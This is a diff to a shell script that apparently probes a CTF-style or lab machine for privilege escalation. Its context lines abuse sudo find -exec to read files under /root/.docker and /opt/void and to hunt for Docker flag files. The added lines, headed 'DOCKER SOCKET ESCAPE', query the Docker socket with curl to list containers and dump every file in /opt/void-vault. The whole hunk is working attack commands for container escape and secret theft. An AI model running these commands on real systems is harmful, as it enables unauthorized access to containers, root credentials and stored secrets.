@@ -38,3 +38,12 @@ sudo find /var/run/docker.sock -exec ls -la {} \; 2>/dev/null
 sudo find /root/.docker -type f -exec cat {} \; 2>/dev/null
 sudo find /opt/void/ -type f -exec cat {} \; 2>/dev/null
 sudo find / -name "docker_flag*" -o -name "*docker*flag*" 2>/dev/null
+
+echo "=== DOCKER SOCKET ESCAPE ==="
+# Use docker socket to list containers
+sudo find /var/run/docker.sock -exec curl -s --unix-socket {} http://localhost/containers/json \; 2>/dev/null
+# List containers via curl
+curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null
+# Read vault contents
+sudo find /opt/void-vault -type f 2>/dev/null | head -20
+sudo find /opt/void-vault -type f -exec cat {} \; 2>/dev/null
